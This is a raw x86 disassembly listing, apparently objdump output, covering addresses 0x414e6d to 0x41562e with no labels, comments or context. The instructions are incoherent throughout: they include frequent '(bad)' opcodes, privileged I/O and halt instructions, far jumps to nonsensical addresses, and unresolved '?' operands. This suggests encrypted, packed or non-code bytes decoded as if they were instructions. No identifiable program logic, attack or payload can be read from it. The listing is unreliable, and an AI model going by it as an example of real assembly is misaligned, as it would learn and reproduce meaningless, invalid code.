  414e6d:	and    ebp,DWORD PTR [ebx]
  414e6f:	rol    eax,0x59
  414e72:	test   al,0x1d
  414e74:	jmp    0xf75b:0xdbfe1970
  414e7b:	(bad)  
  414e7c:	jb     0x414e05
  414e7e:	sbb    ebp,edi
  414e80:	fst    st(6)
  414e82:	and    BYTE PTR ds:0xe25c85ce,0xf
  414e89:	pop    ebp
  414e8a:	lahf   
  414e8b:	push   0xf8b7da49
  414e90:	loop   0x414ea8
  414e92:	into   
  414e93:	lahf   
  414e94:	sub    BYTE PTR [edi+0x1c],cl
  414e97:	mov    DWORD PTR [eax],esp
  414e99:	sbb    dl,BYTE PTR ds:[eax-0x7b]
  414e9d:	enter  0xd2c6,0x4
  414ea1:	xchg   edx,eax
  414ea2:	push   ecx
  414ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ea4:	xchg   ebx,eax
  414ea5:	sub    eax,0x738c23ff
  414eaa:	std    
  414eab:	sbb    ebx,DWORD PTR [edx-0x3d]
  414eae:	xchg   DWORD PTR [edx],ebp
  414eb0:	loop   0x414ecd
  414eb2:	sbb    BYTE PTR [eax],bl
  414eb4:	add    al,0xbd
  414eb6:	cmp    DWORD PTR [edi-0x70e8c72e],0xfd6e5aa1
  414ec0:	dec    edx
  414ec1:	shl    BYTE PTR [ebx+0x7704300b],0x71
  414ec8:	cmp    edx,eax
  414eca:	push   esp
  414ecb:	stc    
  414ecc:	cmp    dl,dl
  414ece:	jae    0x858f8f24
  414ed4:	ret    
  414ed5:	out    0xb8,al
  414ed7:	scas   al,BYTE PTR es:[edi]
  414ed8:	repz lock retf 0x41c8
  414edd:	push   edx
  414ede:	mov    DWORD PTR [edx],eax
  414ee0:	mov    cl,0xf0
  414ee2:	fucomip st,st(0)
  414ee4:	cld    
  414ee5:	hlt    
  414ee6:	mov    bl,BYTE PTR [ecx+edx*8+0x578fc03d]
  414eed:	sahf   
  414eee:	in     al,0xdf
  414ef0:	bound  ebx,QWORD PTR [ecx]
  414ef2:	mov    edx,0xe55b5889
  414ef7:	inc    ebp
  414ef8:	jnp    0x414f2c
  414efa:	es (bad) 
  414efc:	xchg   ecx,eax
  414efd:	cld    
  414efe:	scas   eax,DWORD PTR es:[edi]
  414eff:	sbb    BYTE PTR [ebx+eiz*4-0x7b],ah
  414f03:	ret    0xe0dd
  414f06:	stos   BYTE PTR es:[edi],al
  414f07:	or     eax,0xd9dcff08
  414f0c:	lock retf 
  414f0e:	sub    al,0x14
  414f10:	and    eax,0x2efadc03
  414f15:	jno    0x414f13
  414f17:	jg     0x414f30
  414f19:	mov    ecx,0xd68252a4
  414f1e:	stos   BYTE PTR es:[edi],al
  414f1f:	push   cs
  414f20:	mov    ds:0x35bd2bc,al
  414f25:	rol    BYTE PTR [esi-0x36],cl
  414f28:	repz aaa 
  414f2a:	dec    edx
  414f2b:	xor    BYTE PTR [esi-0x10],bl
  414f2e:	add    esp,eax
  414f30:	ffree  st(1)
  414f32:	mov    eax,0xdb5a82b9
  414f37:	imul   ebx,ebp,0x34
  414f3a:	dec    eax
  414f3b:	jns    0x414ec3
  414f3d:	bound  eax,QWORD PTR [edi+0x61484e7a]
  414f43:	lods   al,BYTE PTR ds:[esi]
  414f44:	ror    DWORD PTR [edx+eiz*1-0x63574a87],1
  414f4b:	popa   
  414f4c:	test   eax,0x89af9569
  414f51:	repz xor BYTE PTR [ebp+0x7bdcd8e5],ah
  414f58:	clc    
  414f59:	add    BYTE PTR [edx+0x6efe52cb],ch
  414f5f:	push   edi
  414f60:	sbb    BYTE PTR [eax],0xe8
  414f63:	js     0x414f89
  414f65:	pop    ecx
  414f66:	adc    BYTE PTR [ecx+0x2c30eeec],bl
  414f6c:	pop    ebp
  414f6d:	popa   
  414f6e:	fdiv   QWORD PTR [esp+ecx*2-0x1f]
  414f72:	xor    al,0xec
  414f74:	add    bh,cl
  414f76:	cmp    bl,dl
  414f78:	mov    ds:0x4925d6a5,eax
  414f7d:	nop
  414f7e:	sbb    DWORD PTR [edi+0x4c],edi
  414f81:	mov    dl,0x4a
  414f83:	pusha  
  414f84:	scas   al,BYTE PTR es:[edi]
  414f85:	jmp    0x6c9deee6
  414f8a:	jmp    0x414f6d
  414f8c:	add    eax,0x43965d63
  414f91:	mov    ?,WORD PTR [edi]
  414f93:	or     eax,0x5cea13ff
  414f98:	cdq    
  414f99:	repnz repnz mov eax,ds:0x639f6456
  414fa0:	ds sbb al,0xed
  414fa3:	fnstcw WORD PTR [edi-0x2a]
  414fa6:	aas    
  414fa7:	mov    ecx,0xff995c12
  414fac:	aaa    
  414fad:	pop    ebp
  414fae:	push   ecx
  414faf:	xchg   esi,eax
  414fb0:	outs   dx,BYTE PTR ds:[esi]
  414fb1:	repz jg 0x41502e
  414fb4:	push   esp
  414fb5:	repz aam 0x2f
  414fb8:	dec    edi
  414fb9:	hlt    
  414fba:	jmp    0xe53f:0x9139847a
  414fc1:	ja     0x414fca
  414fc3:	sti    
  414fc4:	sahf   
  414fc5:	xor    eax,0x6c37cc30
  414fca:	stos   BYTE PTR es:[edi],al
  414fcb:	xor    ebx,0x7
  414fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fcf:	jo     0x414fda
  414fd1:	mov    ah,0x2b
  414fd3:	in     al,dx
  414fd4:	retf   
  414fd5:	test   DWORD PTR es:[edi+0x7d80e8bd],eax
  414fdc:	(bad)  ds:0x2f4aae86
  414fe2:	cmp    BYTE PTR [eax+0x16],ch
  414fe5:	pop    ds
  414fe6:	in     eax,dx
  414fe7:	cmc    
  414fe8:	sbb    ch,BYTE PTR [edx+0x7631787d]
  414fee:	or     al,0xc1
  414ff0:	cwde   
  414ff1:	jb     0x415007
  414ff3:	cmc    
  414ff4:	cmp    eax,0x3ea84c11
  414ff9:	jmp    0xadab0099
  414ffe:	mov    dh,0x3a
  415000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415001:	mov    eax,0x88b637a4
  415006:	cmp    edx,DWORD PTR [ecx]
  415008:	repz fsubr DWORD PTR [esi-0x31]
  41500c:	ror    ch,0xca
  41500f:	sub    eax,0xa3f9c344
  415014:	pop    esi
  415015:	(bad)  
  415016:	mov    cl,0x91
  415018:	inc    ecx
  415019:	mov    ebp,0x252abd56
  41501e:	sub    ah,cl
  415020:	sar    ebp,0x9b
  415023:	shl    BYTE PTR [esi+0x56152d3b],0x68
  41502a:	pop    ebp
  41502b:	xor    al,0x86
  41502d:	cmp    BYTE PTR [esi-0x5a872c59],0x46
  415034:	das    
  415035:	loop   0x415035
  415037:	in     al,dx
  415038:	xor    al,0x1b
  41503a:	fmulp  st(0),st
  41503c:	and    eax,0x8c891f8f
  415041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415042:	popa   
  415043:	lds    esp,FWORD PTR [edx]
  415045:	lods   eax,DWORD PTR ds:[esi]
  415046:	(bad)  
  415047:	js     0x415079
  415049:	push   0xffffffb5
  41504b:	push   eax
  41504c:	jae    0x41501c
  41504e:	inc    ebx
  41504f:	cvtps2pi mm0,xmm1
  415052:	fidiv  WORD PTR [esi+0x57801991]
  415058:	push   0x55
  41505a:	and    esi,ebp
  41505c:	jnp    0x415052
  41505e:	lods   al,BYTE PTR ds:[esi]
  41505f:	xchg   ah,bh
  415061:	imul   BYTE PTR [edi+ebx*1+0x45]
  415065:	iret   
  415066:	shl    BYTE PTR [esi+0x26182185],0x23
  41506d:	pop    edi
  41506e:	sub    DWORD PTR [eax-0x32],0xa
  415072:	icebp  
  415073:	add    dl,dh
  415075:	inc    esi
  415076:	ins    DWORD PTR es:[edi],dx
  415077:	cld    
  415078:	arpl   WORD PTR [ebx-0x50],bx
  41507b:	out    dx,al
  41507c:	mov    eax,ds:0x9127e9ab
  415081:	mov    ecx,0xa3d888bb
  415086:	loope  0x4150c4
  415088:	popf   
  415089:	outs   dx,DWORD PTR ds:[esi]
  41508a:	fldenv [ecx-0xf4cf8aa]
  415090:	pop    eax
  415091:	dec    eax
  415092:	add    bl,BYTE PTR [eax-0x5a]
  415095:	fs inc esi
  415097:	ja     0x4150f0
  415099:	fisub  DWORD PTR [eax]
  41509b:	adc    eax,0xee5958d1
  4150a0:	dec    esi
  4150a1:	adc    esi,DWORD PTR [ecx]
  4150a3:	(bad)  
  4150a4:	pop    ebp
  4150a5:	xor    DWORD PTR ss:[esi+0x771f3640],edx
  4150ac:	and    al,0xd8
  4150ae:	outs   dx,BYTE PTR ds:[esi]
  4150af:	cmp    al,0x8b
  4150b1:	jecxz  0x415079
  4150b3:	dec    ebp
  4150b4:	in     eax,dx
  4150b5:	push   ebp
  4150b6:	fwait
  4150b7:	push   es
  4150b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b9:	or     edi,ebx
  4150bb:	cmp    cl,ah
  4150bd:	xor    eax,0xc088c651
  4150c2:	mov    ?,WORD PTR [edi-0xd1c264d]
  4150c8:	cld    
  4150c9:	mov    eax,0x824f43eb
  4150ce:	call   0x45f:0x6eedfef7
  4150d5:	test   eax,0x33e47a71
  4150da:	push   es
  4150db:	mov    ah,0xef
  4150dd:	lods   eax,DWORD PTR ds:[esi]
  4150de:	xchg   DWORD PTR [esi+0x34],esi
  4150e1:	mov    cl,0x66
  4150e3:	mov    eax,0xc315e91b
  4150e8:	jmp    0x415134
  4150ea:	call   0xbdb3cee1
  4150ef:	xchg   esi,eax
  4150f0:	mov    edi,0x10306eef
  4150f5:	scas   al,BYTE PTR es:[edi]
  4150f6:	mul    BYTE PTR [ebp+0x36e7d78b]
  4150fc:	mov    ds:0xdc0d1838,eax
  415101:	leave  
  415102:	fwait
  415103:	in     eax,0xa4
  415105:	outs   dx,DWORD PTR ds:[esi]
  415106:	xor    eax,0x4088ade
  41510b:	and    eax,0xc4e6bd04
  415110:	es sbb al,0x1d
  415113:	sbb    bh,BYTE PTR [ecx]
  415115:	scas   al,BYTE PTR es:[edi]
  415116:	jle    0x4150c5
  415118:	jl     0x415128
  41511a:	inc    ebp
  41511b:	jl     0x4150bb
  41511d:	imul   ebp,DWORD PTR [edx+0x1f],0x35613052
  415124:	mov    ax,ds:0x49736ab6
  41512a:	cdq    
  41512b:	bound  esp,QWORD PTR [ebp+0x3b0415e9]
  415131:	test   eax,0x459d97b9
  415136:	jae    0x415154
  415138:	push   esi
  415139:	mov    dh,0xf3
  41513b:	cmc    
  41513c:	out    dx,eax
  41513d:	pop    ss
  41513e:	sub    DWORD PTR [edx+0x2c],eax
  415141:	push   es
  415142:	enter  0xcfd8,0x5f
  415146:	and    al,0x5f
  415148:	aas    
  415149:	and    eax,0x967b6904
  41514e:	retf   0x285f
  415151:	add    eax,0x93d148ca
  415156:	gs std 
  415158:	sbb    edx,DWORD PTR [esi+0x12cd1071]
  41515e:	int3   
  41515f:	dec    edx
  415160:	xor    al,0x44
  415162:	cwde   
  415163:	cmp    eax,DWORD PTR [edx+0x101c6d79]
  415169:	(bad)  
  41516a:	inc    eax
  41516b:	mov    DWORD PTR [edx+0x73],0xedb7cd68
  415172:	add    eax,0x70a442b3
  415177:	pop    ebp
  415178:	stos   DWORD PTR es:[edi],eax
  415179:	inc    ecx
  41517a:	pop    ss
  41517b:	xor    BYTE PTR [edi+0x105ede39],bh
  415181:	shl    DWORD PTR [eax+ecx*4-0x510ca93f],1
  415188:	mov    cl,0xb0
  41518a:	mov    eax,0x68c3efb7
  41518f:	cld    
  415190:	jg     0x41518d
  415192:	dec    esi
  415193:	push   ecx
  415194:	cmp    ecx,esp
  415196:	xchg   ecx,eax
  415197:	adc    eax,0x15e889d2
  41519c:	push   0xb68ab0e6
  4151a1:	(bad)  
  4151a2:	jbe    0x4151d7
  4151a4:	fsubr  st,st(5)
  4151a6:	inc    esi
  4151a7:	or     eax,0xd7c2d173
  4151ac:	add    esp,0x6cd32b92
  4151b2:	out    0x69,al
  4151b4:	(bad)  
  4151b5:	lahf   
  4151b6:	test   ebx,ecx
  4151b8:	fdivr  QWORD PTR [edx]
  4151ba:	fbstp  TBYTE PTR [ebx]
  4151bc:	jb     0x4151ee
  4151be:	push   0xffffff9d
  4151c0:	(bad)  
  4151c1:	aam    0xd2
  4151c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c4:	dec    esp
  4151c5:	es shl al,0xaa
  4151c9:	mov    esi,0xaf094c59
  4151ce:	push   ebx
  4151cf:	dec    esi
  4151d0:	mov    ss,WORD PTR [ebx+edx*8]
  4151d3:	aas    
  4151d4:	ins    BYTE PTR es:[edi],dx
  4151d5:	ficom  DWORD PTR [ebx+0x7e25d2a7]
  4151db:	adc    esp,ebx
  4151dd:	xchg   edi,eax
  4151de:	je     0x415181
  4151e0:	or     eax,0x6b10a94e
  4151e5:	mov    al,0x89
  4151e7:	mov    esi,0x8d36e468
  4151ec:	mul    DWORD PTR [edi-0x1b]
  4151ef:	xchg   ebx,eax
  4151f0:	jecxz  0x415200
  4151f2:	mov    cl,0xd4
  4151f4:	ja     0x4151d7
  4151f6:	mov    esp,0xcb588359
  4151fb:	stos   BYTE PTR es:[edi],al
  4151fc:	ins    DWORD PTR es:[edi],dx
  4151fd:	and    cl,ch
  4151ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415200:	and    BYTE PTR [edi+edi*2],0xc8
  415204:	shl    DWORD PTR [ebx],0x40
  415207:	xchg   edi,eax
  415208:	cmc    
  415209:	(bad)
  41520d:	mov    ah,0xa8
  41520f:	fsubr  DWORD PTR [eax]
  415211:	test   esi,edx
  415213:	inc    edx
  415214:	dec    esi
  415215:	stos   BYTE PTR es:[edi],al
  415216:	sub    BYTE PTR [ebp-0x37d83cbe],dh
  41521c:	je     0x4151b5
  41521e:	xchg   edi,eax
  41521f:	xor    cl,BYTE PTR [ecx-0x23]
  415222:	pop    ebp
  415223:	xlat   BYTE PTR ds:[ebx]
  415224:	and    DWORD PTR [ecx+ebx*8+0x77614bf6],edi
  41522b:	jae    0x415214
  41522d:	jns    0x41520d
  41522f:	outs   dx,DWORD PTR ds:[esi]
  415230:	cwde   
  415231:	xchg   esp,eax
  415232:	push   edi
  415233:	test   BYTE PTR [edx],ah
  415235:	jbe    0x415266
  415237:	push   ebp
  415238:	icebp  
  415239:	mov    edi,0x55625b52
  41523e:	sbb    DWORD PTR [esi],esp
  415240:	hlt    
  415241:	mov    ecx,DWORD PTR [ebx-0x28ad9bd9]
  415247:	mov    bh,0xa1
  415249:	sbb    BYTE PTR [ebp-0x91fd293],dl
  41524f:	xchg   BYTE PTR [ecx],al
  415251:	sbb    al,0x8f
  415253:	sti    
  415254:	xchg   DWORD PTR [ecx],eax
  415256:	mov    ebp,0x8f044d60
  41525b:	in     al,dx
  41525c:	icebp  
  41525d:	cmp    ebx,DWORD PTR [edi]
  41525f:	or     eax,0x5f930745
  415264:	sub    eax,0x30ff35ff
  415269:	mov    BYTE PTR [ebp+0x4b],dl
  41526c:	sub    eax,DWORD PTR [esi-0x56c6138c]
  415272:	sub    edx,DWORD PTR [ebx]
  415274:	popa   
  415275:	pushf  
  415276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415277:	mov    ds:0x14706931,eax
  41527c:	mov    al,ds:0x2dfabe7c
  415281:	inc    esi
  415282:	ret    0x4915
  415285:	cmp    eax,0xa0e181ae
  41528a:	mov    DWORD PTR [eax+0x0],edi
  41528d:	xchg   edi,eax
  41528e:	das    
  41528f:	adc    al,0xc6
  415291:	or     BYTE PTR [ecx+0x3f],dl
  415294:	or     cl,al
  415296:	xor    cl,BYTE PTR [ecx+0x18401fbd]
  41529c:	pop    edx
  41529d:	jbe    0x4152ad
  41529f:	adc    cl,ah
  4152a1:	and    al,0xb5
  4152a3:	les    edi,FWORD PTR [ebx+esi*4]
  4152a6:	stos   DWORD PTR es:[edi],eax
  4152a7:	mov    al,0x29
  4152a9:	dec    eax
  4152aa:	(bad)  
  4152ac:	add    BYTE PTR [edi-0x64],0xdf
  4152b0:	or     ebp,DWORD PTR [eax+eiz*1-0x6a]
  4152b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b5:	jge    0x4152b0
  4152b7:	or     eax,0x3f28eb62
  4152bc:	int3   
  4152bd:	test   BYTE PTR [ecx],bh
  4152bf:	xchg   edx,eax
  4152c0:	dec    eax
  4152c1:	scas   al,BYTE PTR es:[edi]
  4152c2:	repnz popf 
  4152c4:	popa   
  4152c5:	dec    esi
  4152c6:	data16 mov bh,0xbd
  4152c9:	fdivr  st,st(6)
  4152cb:	xor    BYTE PTR [ebx+0x1b],dh
  4152ce:	lods   eax,DWORD PTR ds:[esi]
  4152cf:	in     al,0xe0
  4152d1:	arpl   di,dx
  4152d3:	shl    DWORD PTR [eax],cl
  4152d5:	dec    esi
  4152d6:	ror    BYTE PTR [ecx+0x4f35652b],0x94
  4152dd:	je     0x415291
  4152df:	inc    esp
  4152e0:	test   al,0x7d
  4152e2:	fild   WORD PTR [edx+edx*1+0x69]
  4152e6:	jg     0x9eb5e3af
  4152ec:	in     eax,dx
  4152ed:	js     0x415284
  4152ef:	ss xor al,0x1f
  4152f2:	xchg   ecx,eax
  4152f3:	fnstenv [ebx]
  4152f5:	nop
  4152f6:	adc    al,0xdb
  4152f8:	pop    ecx
  4152f9:	cmp    esi,esp
  4152fb:	hlt    
  4152fc:	(bad)  
  4152fd:	push   eax
  4152fe:	xchg   DWORD PTR [esi],esi
  415300:	sar    BYTE PTR [edi-0x5527fcd5],0x59
  415307:	outs   dx,DWORD PTR ds:[esi]
  415308:	cli    
  415309:	inc    edx
  41530a:	out    dx,eax
  41530b:	cdq    
  41530c:	cmp    al,0x22
  41530e:	outs   dx,BYTE PTR ds:[esi]
  41530f:	sub    eax,0x699548ff
  415314:	adc    DWORD PTR [ecx-0x27],ecx
  415317:	push   esi
  415318:	aas    
  415319:	mov    edx,0x220a19d
  41531e:	aam    0xac
  415320:	or     dh,BYTE PTR [edi]
  415322:	adc    BYTE PTR [eax+0x46],dh
  415325:	mov    ?,ebx
  415327:	push   ebx
  415328:	pusha  
  415329:	mov    ds:0x70480324,al
  41532e:	jecxz  0x41535e
  415330:	dec    ecx
  415331:	out    dx,al
  415332:	sub    DWORD PTR [edx-0x53552dc8],ecx
  415338:	adc    DWORD PTR [ecx-0x22],ecx
  41533b:	mov    esi,0x8467e222
  415340:	loop   0x4152c6
  415342:	sub    al,dh
  415344:	and    ebp,DWORD PTR ds:0xcf1dd922
  41534a:	jbe    0x415302
  41534c:	xor    bl,bl
  41534e:	inc    ebx
  41534f:	mov    ebp,0x4bf467b0
  415354:	mov    ds:0x2d9b7e26,eax
  415359:	xlat   BYTE PTR ds:[ebx]
  41535a:	mov    cl,0xf3
  41535c:	arpl   WORD PTR [esi],ax
  41535e:	jmp    0x415341
  415360:	inc    ebx
  415361:	cli    
  415362:	mov    edi,0xfc2a3408
  415367:	add    DWORD PTR [ebp+0x72],ecx
  41536a:	xchg   DWORD PTR [ebx],esp
  41536c:	sar    DWORD PTR ds:0x643fdb4c,1
  415372:	inc    edx
  415373:	sbb    eax,0xa2c77b98
  415378:	mov    al,0xcc
  41537a:	cdq    
  41537b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41537c:	rol    BYTE PTR [esp+eiz*2+0x70],0x7f
  415381:	push   edi
  415382:	jg     0x41533e
  415384:	jl     0x4153b3
  415386:	cmc    
  415387:	cmp    al,0x10
  415389:	sub    dl,BYTE PTR [eax-0x5a]
  41538c:	or     al,0x8
  41538e:	outs   dx,BYTE PTR ds:[esi]
  41538f:	nop
  415390:	inc    edi
  415391:	cmp    BYTE PTR [edx-0x395679ac],ch
  415397:	push   ecx
  415398:	loopne 0x4153c7
  41539a:	(bad)  
  41539b:	fdivp  st(5),st
  41539d:	pop    ebp
  41539e:	pop    ecx
  41539f:	imul   esp,DWORD PTR [edx+0x18],0xffffff90
  4153a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153a4:	jbe    0x415336
  4153a6:	ds scas eax,DWORD PTR es:[edi]
  4153a8:	(bad)  
  4153a9:	sub    DWORD PTR [edx*8-0x4ec46a02],eax
  4153b0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4153b2:	enter  0x5aab,0xdc
  4153b6:	mov    esp,0xda59aecf
  4153bb:	push   ebx
  4153bc:	cmp    esi,DWORD PTR [ecx+0x2f35e952]
  4153c2:	and    BYTE PTR ds:0x3c640180,ah
  4153c8:	int    0xd7
  4153ca:	scas   eax,DWORD PTR es:[edi]
  4153cb:	mov    esp,0x3c4acbab
  4153d0:	test   BYTE PTR [edx],ch
  4153d2:	bound  ecx,QWORD PTR [esi]
  4153d4:	pop    ss
  4153d5:	mov    ecx,0xe957d5ea
  4153da:	cmp    DWORD PTR [eax+0x1d62e09b],edi
  4153e0:	push   edx
  4153e1:	inc    edx
  4153e2:	(bad)  
  4153e3:	in     al,dx
  4153e4:	pushw  0x46
  4153e7:	retf   
  4153e8:	hlt    
  4153e9:	mov    ecx,0xb2e85318
  4153ee:	and    BYTE PTR [ebx],0x81
  4153f1:	stos   BYTE PTR es:[edi],al
  4153f2:	pop    ds
  4153f3:	push   ecx
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	shl    DWORD PTR [ebp-0x7bcda4a7],cl
  4153fb:	mov    WORD PTR [ebp+0x5b2342ec],ds
  415401:	xchg   edi,eax
  415402:	(bad)
  415405:	imul   edx,DWORD PTR [ecx-0x3d1955c9],0x35
  41540c:	cmp    eax,0x6e1664cb
  415411:	outs   dx,BYTE PTR ds:[esi]
  415412:	adc    BYTE PTR [ebp-0x6e9d8b11],bl
  415418:	loopne 0x41543d
  41541a:	jecxz  0x415483
  41541c:	loop   0x415423
  41541e:	pop    eax
  41541f:	add    BYTE PTR [edi-0x6d],dh
  415422:	in     al,dx
  415423:	xor    eax,0x5642d565
  415428:	ss mov eax,0x6a0459f7
  41542e:	fwait
  41542f:	iret   
  415430:	bound  edi,QWORD PTR [ecx-0x229d5ab6]
  415436:	xchg   edi,eax
  415437:	jl     0x4153e8
  415439:	adc    eax,ebx
  41543b:	jnp    0x4153fc
  41543d:	das    
  41543e:	push   eax
  41543f:	fs push ebx
  415441:	xchg   ebp,eax
  415442:	push   esi
  415443:	push   ebp
  415444:	and    ecx,esp
  415446:	stos   BYTE PTR es:[edi],al
  415447:	xor    al,0xae
  415449:	adc    al,0x35
  41544b:	call   0x4f928672
  415450:	cs dec eax
  415452:	push   ebx
  415453:	xchg   ecx,eax
  415454:	test   BYTE PTR [ebx],dl
  415456:	stos   BYTE PTR es:[edi],al
  415457:	cmp    cl,0x9f
  41545a:	mov    esp,0x6739cad9
  41545f:	in     al,dx
  415460:	mov    ecx,0x5f2eb38c
  415465:	cmp    bl,bh
  415467:	imul   edi,DWORD PTR [di],0xb1b99e50
  41546e:	aad    0x95
  415470:	and    DWORD PTR [ebx-0x360e22e4],esp
  415476:	inc    ecx
  415477:	inc    ebp
  415478:	jle    0x4154a5
  41547a:	addr16 xchg ecx,eax
  41547c:	and    al,0x78
  41547e:	in     al,0x1a
  415480:	inc    esp
  415481:	push   ss
  415482:	out    0x53,eax
  415484:	sub    eax,0xdb92ab06
  415489:	loopne 0x4154e0
  41548b:	lea    edi,[ebp-0x66a4d959]
  415491:	(bad)  
  415492:	stos   BYTE PTR es:[edi],al
  415493:	mov    eax,0x7a43cd66
  415498:	pusha  
  415499:	sub    edi,DWORD PTR [esi]
  41549b:	in     eax,0xb6
  41549d:	mov    ch,0xaf
  41549f:	outs   dx,BYTE PTR ds:[esi]
  4154a0:	mov    dl,0xca
  4154a2:	loope  0x415476
  4154a4:	and    ecx,0x6f
  4154a7:	addr16 js 0x415431
  4154aa:	xchg   ecx,eax
  4154ab:	or     ah,bl
  4154ad:	inc    edx
  4154ae:	in     al,dx
  4154af:	add    DWORD PTR [ebx],esp
  4154b1:	popf   
  4154b2:	fdivr  DWORD PTR ds:0xdbd80ec
  4154b8:	dec    ebx
  4154b9:	(bad)  
  4154ba:	mov    dh,0xd7
  4154bc:	cdq    
  4154bd:	inc    ebp
  4154be:	xlat   BYTE PTR ds:[ebx]
  4154bf:	arpl   WORD PTR [edi-0x103c8dac],bx
  4154c5:	cli    
  4154c6:	inc    edi
  4154c7:	inc    edi
  4154c8:	mov    al,ds:0x2fe9371e
  4154cd:	rol    BYTE PTR [esi+0x6804291f],0x9f
  4154d4:	mov    eax,ds:0xf6ad0b92
  4154d9:	jp     0x415531
  4154db:	jb     0x415535
  4154dd:	sub    BYTE PTR [ecx+0x5a],bh
  4154e0:	int3   
  4154e1:	ror    DWORD PTR [eax+0x7e],1
  4154e4:	neg    esi
  4154e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e7:	fwait
  4154e8:	push   ecx
  4154e9:	xor    al,0xd1
  4154eb:	test   BYTE PTR [ecx+0x1e],0x5a
  4154ef:	ds shl ebx,0x7e
  4154f3:	push   edx
  4154f4:	retf   0xf46a
  4154f7:	enter  0xedd4,0x54
  4154fb:	add    eax,0x61175de9
  415500:	pop    esp
  415501:	mov    bl,0x6b
  415503:	inc    edi
  415504:	fild   DWORD PTR [ecx+0x6a]
  415507:	test   DWORD PTR [edx],edi
  415509:	and    al,BYTE PTR [ecx]
  41550b:	movsx  edi,WORD PTR [edi]
  41550e:	dec    ebx
  41550f:	mov    esp,0x8b616b71
  415514:	sub    bl,BYTE PTR [edx-0xe]
  415517:	ins    BYTE PTR es:[edi],dx
  415518:	jecxz  0x41551e
  41551a:	call   DWORD PTR [eax-0x2d]
  41551d:	jg     0x4154be
  41551f:	xor    DWORD PTR [ecx],edx
  415521:	xor    BYTE PTR [edi],bh
  415523:	jmp    0xd3df:0x37b9559
  41552a:	into   
  41552b:	sbb    BYTE PTR [eax],bl
  41552d:	stos   BYTE PTR es:[edi],al
  41552e:	fnstsw WORD PTR [edx+0x76077db9]
  415534:	out    dx,eax
  415535:	cld    
  415536:	inc    esp
  415537:	lock jle 0x415590
  41553a:	xchg   DWORD PTR [edx+eax*1-0x59],edx
  41553e:	daa    
  41553f:	js     0x415501
  415541:	add    al,BYTE PTR [edx+0x1213f079]
  415547:	(bad)  
  415548:	lock push eax
  41554a:	dec    edi
  41554b:	push   0x66
  41554d:	and    dh,al
  41554f:	xchg   edx,eax
  415550:	jp     0x415537
  415552:	pop    esi
  415553:	push   esp
  415554:	push   ecx
  415555:	jg     0x415507
  415557:	pop    ecx
  415558:	add    eax,0x203fb8d4
  41555d:	xor    dl,BYTE PTR [ebx-0x66]
  415560:	xchg   edx,eax
  415561:	pcmpgtb mm1,QWORD PTR [ecx]
  415564:	add    DWORD PTR [edx-0x6ae48a96],esi
  41556a:	inc    esi
  41556b:	pop    ebx
  41556c:	paddq  mm6,QWORD PTR [esi-0x2d]
  415570:	pusha  
  415571:	and    eax,0xc322f68
  415576:	add    ch,BYTE PTR [edi+0x22]
  415579:	pop    ss
  41557a:	cmp    bh,0x1
  41557d:	iret   
  41557e:	and    DWORD PTR [esi+0x5096bbb5],esp
  415584:	inc    ecx
  415585:	stc    
  415586:	aad    0xd5
  415588:	pushf  
  415589:	cwde   
  41558a:	fadd   DWORD PTR [ebp+0x37daa65e]
  415590:	mov    esp,0xf0989b4d
  415595:	repz cmc 
  415597:	jmp    0x4155ef
  415599:	scas   al,BYTE PTR es:[edi]
  41559a:	cmp    eax,0xfc966a79
  41559f:	jnp    0x415593
  4155a1:	iret   
  4155a2:	mov    cs,WORD PTR [edx]
  4155a4:	fmul   st,st(3)
  4155a6:	sub    ebx,DWORD PTR [ecx]
  4155a8:	dec    ebx
  4155a9:	adc    eax,0x80740233
  4155ae:	in     al,0x87
  4155b0:	stos   DWORD PTR es:[edi],eax
  4155b1:	inc    ecx
  4155b2:	mov    al,0x8d
  4155b4:	dec    ebp
  4155b5:	cmp    DWORD PTR [ebp+0xe],esi
  4155b8:	jno    0x415553
  4155ba:	(bad)  
  4155bb:	cli    
  4155bc:	xchg   ebp,eax
  4155bd:	cmp    BYTE PTR [edi],ah
  4155bf:	jo     0x415605
  4155c1:	popf   
  4155c2:	xchg   ecx,esp
  4155c4:	out    dx,al
  4155c5:	mov    ebp,0x4782ed76
  4155ca:	pop    esi
  4155cb:	and    ecx,DWORD PTR [ecx+edi*8-0x6ae0e02d]
  4155d2:	aas    
  4155d3:	adc    DWORD PTR [edi+0x43751b25],edx
  4155d9:	in     al,dx
  4155da:	ins    DWORD PTR es:[edi],dx
  4155db:	cli    
  4155dc:	mov    dh,0xab
  4155de:	aam    0x68
  4155e0:	js     0x41560b
  4155e2:	xchg   BYTE PTR [ebx+0x3872de9b],dl
  4155e8:	and    eax,0x9f175cd9
  4155ed:	mul    DWORD PTR [eax-0x2c73276]
  4155f3:	fild   QWORD PTR [edi]
  4155f5:	xchg   BYTE PTR [esi],cl
  4155f7:	xchg   edx,eax
  4155f8:	mov    ah,BYTE PTR [edi+0x233b39e4]
  4155fe:	sbb    BYTE PTR [ebx],dl
  415600:	test   DWORD PTR [ecx+0xe],edi
  415603:	adc    cl,ch
  415605:	in     eax,0xde
  415607:	popf   
  415608:	pop    es
  415609:	out    dx,al
  41560a:	xchg   BYTE PTR [ebp+eiz*8-0x322c8f90],ch
  415611:	xor    edx,0x30b405e2
  415617:	ins    BYTE PTR es:[edi],dx
  415618:	xchg   ecx,eax
  415619:	and    dl,BYTE PTR [edx]
  41561b:	in     al,dx
  41561c:	pop    esi
  41561d:	pop    es
  41561e:	rol    BYTE PTR [ebp-0x7bc0f650],0x91
  415625:	inc    ecx
  415626:	adc    al,0x11
  415628:	(bad)
  41562c:	cwde   
  41562d:	xchg   ecx,eax
  41562e:	(bad)  
